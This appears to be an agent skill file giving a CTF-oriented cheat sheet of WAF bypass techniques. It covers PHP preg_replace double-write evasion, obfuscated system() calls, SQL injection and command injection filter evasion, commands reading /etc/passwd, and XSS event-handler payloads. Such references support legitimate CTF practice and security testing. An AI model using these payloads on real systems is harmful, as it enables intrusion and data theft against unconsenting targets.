---
name: waf-bypass
description: WAF bypass techniques reference — methods for bypassing various WAF types
---

# WAF Bypass Techniques Reference

## PHP WAF Bypass

### preg_replace Double-Write Bypass (Key Technique)

`preg_replace()` performs **iterative replacement** until no matches remain, but if the keyword is reconstructed **after replacement**, only the inner layer is replaced while the outer layer remains.

**Core Principle**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → deletes middle `NSSCTF` → leaves `NSS` + `CTF` = `NSSCTF`

**General Template**:
```
Assume filtered keyword is X (e.g., NSSCTF)
Construct input: X split in half, embed complete X in middle
i.e.: X_first_half + X + X_second_half

Examples:
Filter NSSCTF → input NSS + NSSCTF + CTF = NSSNSSCTFCTF
Filter flag   → input fl + flag + ag = flflagag
Filter cat    → input ca + cat + t = cacatt
Filter system → input sys + system + tem = syssystemtem
```

**Why simple case-mixing doesn't work for preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` doesn't match `NSS` (no i flag) → outputs `NssCTF` unchanged
- `NssCTF !== "NSSCTF"` (strict comparison fails) → bypass fails
- Only double-write bypass can reconstruct the **exact original keyword string** after replacement

**⚠️ Detection Scenario**:
- Source contains `preg_replace('/keyword/', '', $input)` and `$input` must equal the keyword **after replacement** → immediately use double-write bypass
- Don't attempt case-mixing (post-replacement ≠ original keyword) or encoding bypass (encoded string ≠ original keyword)

### Function Name Obfuscation
- Base64 decode restoration: `$f=base64_decode('c3lzdGVt');$f('id');`
- String concatenation: `$f='sys'.'tem';$f('id');`
- Variable functions: `$a='sys';$b='tem';$a$b('id');`

### Keyword Bypass
- Path splitting: `'/va'.'r/ww'.'w/ht'.'ml'`
- Comment bypass: `sys/**/tem('id');`
- String reversal: `$f=strrev('metsys');$f('id');`

## SQL Injection Bypass

### Keyword Bypass
- Case mixing: `SeLeCt` instead of `SELECT`
- Inline comments: `S/*!ELECT*/`
- Double encoding: `%2565` → `%65` → `e`
- Equivalent functions: `GROUP_CONCAT` instead of `concat_ws`

### Comment Variants
- `-- -` instead of `--`
- `--+` instead of `-- `
- `#` instead of `--`

## Command Injection Bypass

### Separator Variants
- Newline: `id\nwhoami`
- Pipe: `id|whoami`
- Logical AND: `id&&whoami`
- Subshell: `$(id)` or `` `id` ``

### Command Obfuscation
- Variable concatenation: `a=i;b=d;$a$b`
- Wildcards: `/bin/ca? /etc/pas?d`
- Empty variable: `c'a't /etc/passwd`
- Escape: `c\at /etc/passwd`

## XSS Bypass

### Tag Variants
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### Event Handlers
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### Encoding Bypass
- HTML entity encoding
- Unicode encoding
- Base64 encoding (with eval)
